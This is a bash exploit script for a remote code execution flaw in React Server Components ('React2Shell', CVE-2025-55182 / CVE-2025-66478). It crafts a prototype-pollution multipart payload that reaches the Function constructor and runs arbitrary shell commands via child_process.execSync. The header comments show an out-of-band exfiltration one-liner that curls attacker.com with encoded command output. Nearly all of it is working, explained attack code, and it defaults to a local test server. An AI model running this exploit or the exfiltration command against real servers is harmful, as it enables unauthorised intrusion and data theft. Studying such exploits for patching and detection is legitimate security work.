#!/bin/bash
# exploit-blind.sh - React2Shell blind RCE (CVE-2025-55182 / CVE-2025-66478)
#
# Blind execution mode: command runs on server, output appears in server terminal only.
# HTTP 200 response (connection hangs until timeout because Promise never settles).
# Use for fire-and-forget or out-of-band exfiltration (e.g., curl to attacker server).
#
# Usage: ./exploit-blind.sh [TARGET_URL] [COMMAND]
# Example: ./exploit-blind.sh http://localhost:3443 "id"
# OOB exfil: ./exploit-blind.sh http://target "curl https://attacker.com/$(id|base64)"

set -e

# Default to the port our vulnerable server is running on
TARGET="${1:-http://localhost:3443}"
COMMAND="${2:-id}"

echo "[*] React2Shell Exploit - blind mode (CVE-2025-55182 / CVE-2025-66478)"
echo "[*] Target: ${TARGET}"
echo "[*] Command: ${COMMAND}"
echo ""

# Create temp files for the multipart payload
# Using files avoids shell escaping issues with JSON special characters
TMPDIR=$(mktemp -d)
CHUNK0="${TMPDIR}/chunk0.json"
CHUNK1="${TMPDIR}/chunk1.json"

cleanup() {
    rm -rf "${TMPDIR}"
}
trap cleanup EXIT

# Build the crafted chunk JSON payload
# This exploits the prototype pollution in RSC Flight protocol deserialization:
# 1. "then": "$1:__proto__:then" - hijacks Chunk.prototype.then via prototype pollution
# 2. "status": "resolved_model" - triggers initializeModelChunk()
# 3. "reason": -1 - bypasses toString check in initializeModelChunk
# 4. "value": inner JSON parsed during model initialization, contains $B0 blob reference
# 5. "_response._formData.get": "$1:constructor:constructor" -> Function constructor
# 6. "_response._prefix": code string passed to Function() for execution
#
# The $B0 blob reference triggers: response._formData.get(response._prefix + "0")
# Which becomes: Function("code_here" + "0") -> executes our code
cat > "${CHUNK0}" << 'INNEREOF'
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"PLACEHOLDER","_formData":{"get":"$1:constructor:constructor"}}}
INNEREOF

# Replace PLACEHOLDER with the actual command
# Escape single quotes in command for JavaScript string
ESCAPED_CMD=$(echo "$COMMAND" | sed "s/'/\\\\'/g")
sed -i.bak "s|PLACEHOLDER|process.mainModule.require('child_process').execSync('${ESCAPED_CMD}');|" "${CHUNK0}"
rm -f "${CHUNK0}.bak"

# Part 1: "$@0" - raw chunk reference that gets Chunk object for chunk 0
# This is used by $1:constructor:constructor to reach Function via:
#   chunk1 (string "$@0") -> its constructor (String) -> String's constructor (Function)
printf '"$@0"' > "${CHUNK1}"

# Send the exploit request using curl's -F flag for proper multipart encoding
# The -F flag handles CRLF line endings correctly (required by multipart spec)
# Next-Action header triggers the RSC server function code path before action validation
RESPONSE=$(curl -s -w "\n%{http_code}" \
    -X POST "${TARGET}" \
    -H "Next-Action: x" \
    -F "0=<${CHUNK0}" \
    -F "1=<${CHUNK1}" \
    --max-time 30 \
    2>&1)

HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY_RESPONSE=$(echo "$RESPONSE" | sed '$d')

echo "[*] HTTP Status: ${HTTP_CODE}"
echo "[*] Response:"
echo "${BODY_RESPONSE}"
echo ""

if [[ "${HTTP_CODE}" == "200" ]] || [[ "${HTTP_CODE}" == "000" ]]; then
    echo "[+] Exploit likely succeeded (HTTP ${HTTP_CODE})"
    echo "[*] Command output appears in server process stdout"
elif [[ "${HTTP_CODE}" == "500" ]]; then
    echo "[?] Server returned 500 - check if command executed"
    echo "[*] Some errors are expected during exploit chain"
else
    echo "[-] Unexpected response - target may be patched or unreachable"
fi
